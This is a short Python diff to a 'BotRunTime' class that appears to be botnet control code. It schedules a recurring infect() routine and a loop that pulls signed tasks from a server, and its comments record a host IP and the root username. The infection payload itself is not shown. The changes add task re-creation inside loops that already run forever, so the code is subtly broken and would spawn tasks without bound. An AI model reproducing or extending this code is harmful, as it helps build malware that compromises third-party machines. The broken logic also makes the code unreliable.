@@ -6,8 +6,8 @@ class BotRunTime:
     def __init__(self, loop, server):
         self.loop = loop
         self.server = server
-        loop.create_task(self.infect())
-        loop.create_task(self.get_and_schedule_job())
+        self.loop.create_task(self.infect())
+        self.loop.create_task(self.get_and_schedule_job())
 
 #host ip:10.142.0.2
 #host username:root
@@ -22,12 +22,14 @@ class BotRunTime:
             #print(i.host for i in botnet.botnet)
             j=j+1
             await sleep(settings.INFECTION_CYCLE_TIME)
+            self.loop.create_task(self.infect())
 
     async def get_and_schedule_job(self):
         while True:
             signed_task_description = self.server.get('task')
            # print(signed_task_description)
             await sleep(settings.GET_JOB_CYCLE_TIME)
+            self.loop.create_task(self.get_and_schedule_job())
 
     def run(self):
         try:
